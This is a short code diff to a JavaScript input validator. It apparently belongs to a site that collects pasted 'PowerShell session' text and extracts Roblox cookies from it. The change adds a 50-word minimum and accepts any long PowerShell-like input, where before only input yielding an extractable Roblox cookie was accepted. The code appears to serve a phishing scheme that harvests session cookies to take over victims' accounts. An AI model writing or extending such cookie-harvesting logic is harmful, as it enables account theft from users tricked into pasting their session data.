@@ -70,14 +70,30 @@ function isValidCode(code) {
         return { valid: false, reason: 'This input has already been submitted!' };
     }
 
-    // ONLY allow Roblox cookie extraction - block everything else
+    // Count words in the input
+    const words = cleanCode.split(/\s+/).filter(word => word.length > 0);
+    const wordCount = words.length;
+    
+    // Minimum word count requirement based on PowerShell session example
+    const minWordCount = 50; // Based on the provided example having ~50+ meaningful words
+    
+    if (wordCount < minWordCount) {
+        return { valid: false, reason: `Input too short. Minimum ${minWordCount} words required for analysis.` };
+    }
+
+    // Check for Roblox cookie extraction (preferred)
     const robloxCookie = extractRobloxCookie(cleanCode);
     if (robloxCookie) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // Block everything that's not a cookie
-    return { valid: false, reason: 'Only PowerShell cookie extraction is allowed!', isBlocked: true };
+    // Allow any PowerShell-like code that meets the word count requirement
+    if (wordCount >= minWordCount) {
+        return { valid: true, type: 'powershell_code' };
+    }
+
+    // Block everything else
+    return { valid: false, reason: 'Only PowerShell code with sufficient length is allowed!', isBlocked: true };
 }
 
 function checkRateLimit() {
